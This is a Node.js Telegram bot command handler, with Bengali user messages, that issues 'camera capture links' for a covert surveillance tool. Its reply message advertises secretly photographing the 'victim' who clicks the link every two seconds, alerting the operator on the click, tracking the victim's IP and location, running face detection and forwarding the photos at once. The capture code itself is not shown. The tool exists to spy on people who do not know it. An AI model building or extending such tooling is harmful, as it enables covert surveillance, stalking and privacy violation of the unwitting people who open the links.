const authMiddleware = require('../middlewares/auth');
const rateLimiter = require('../middlewares/rateLimiter');
const generator = require('../utils/generator');

module.exports = async (bot, msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userName = msg.from.first_name;

    try {
        const auth = await authMiddleware(msg);
        if (!auth.allowed) {
            return bot.sendMessage(chatId, `⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 ⛔\n\n${userName}, আপনার অনুমতি নেই।`);
        }
        
        const rateLimit = rateLimiter(userId);
        if (!rateLimit.allowed) {
            return bot.sendMessage(chatId, '⚠️ রেট লিমিট এক্সিডেড!');
        }
        
        // ক্যামেরা লিংক জেনারেট
        const link = await generator.generateCameraLink(userId);
        
        auth.user.totalLinks += 1;
        await auth.user.save();
        
        const message = `✅ 𝐂𝐀𝐌𝐄𝐑𝐀 𝐂𝐀𝐏𝐓𝐔𝐑𝐄 𝐋𝐈𝐍𝐊\n\n` +
            `🔗 আপনার লিঙ্ক:\n${link.url}\n\n` +
            `📸 ক্যাপচার মোড: প্রতি ২ সেকেন্ডে ফটো\n` +
            `🖼️ ইমেজ কোয়ালিটি: এইচডি\n` +
            `💾 স্টোরেজ: ৭ দিন\n` +
            `👀 ভিক্টিম ক্লিক করলে জানানো হবে\n\n` +
            `⚡ ফিচার:\n` +
            `• ফটো পেলেই ইনস্ট্যান্ট ফরওয়ার্ড\n` +
            `• আইপি ও লোকেশন ট্র্যাকিং\n` +
            `• ফেস ডিটেকশন এলার্ট\n` +
            `• মাল্টিপল এঙ্গেল ক্যাপচার\n\n` +
            `⚠️ লিংকটি শুধুমাত্র আপনার জন্য, শেয়ার করবেন না।`;
        
        await bot.sendMessage(chatId, message);
        
    } catch (error) {
        console.error('Camera Command Error:', error);
        await bot.sendMessage(chatId, '❌ এরর হয়েছে।');
    }
};